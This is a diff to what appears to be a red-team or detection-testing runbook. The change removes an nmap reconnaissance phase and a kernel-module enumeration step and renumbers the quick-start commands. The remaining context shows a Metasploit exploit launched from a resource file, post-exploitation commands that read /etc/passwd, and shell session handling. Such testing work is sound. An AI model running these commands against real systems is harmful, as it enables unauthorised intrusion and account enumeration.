@@ -21,15 +21,6 @@ echo "Target: $TARGET_IP | Attacker: $ATTACKER_IP"
 
 ---
 
-## Phase 0: Reconnaissance
-
-```bash
-# Port scan with service detection
-nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open $TARGET_IP
-```
-
----
-
 ## Phase 1: Initial Access (Metasploit)
 
 Create a resource file `exploit.rc`:
@@ -90,9 +81,6 @@ id
 uname -a
 hostname
 cat /etc/passwd | grep -v nologin
-
-# Enumerate kernel modules (triggers Enumeration of Kernel Modules rule)
-lsmod
 
 exit
 ```
@@ -182,15 +170,12 @@ exit
 export TARGET_IP="10.0.1.x"
 export ATTACKER_IP="10.0.1.x"
 
-# 2. Run nmap scan
-nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open $TARGET_IP
+# 2. Create exploit.rc (run the Phase 1 cat command above)
 
-# 3. Create exploit.rc (run the Phase 1 cat command above)
-
-# 4. Start Metasploit with the exploit
+# 3. Start Metasploit with the exploit
 msfconsole -r /tmp/exploit.rc
 
-# 5. After getting shell, interact:
+# 4. After getting shell, interact:
 sessions -l
 sessions -i 1
 ```
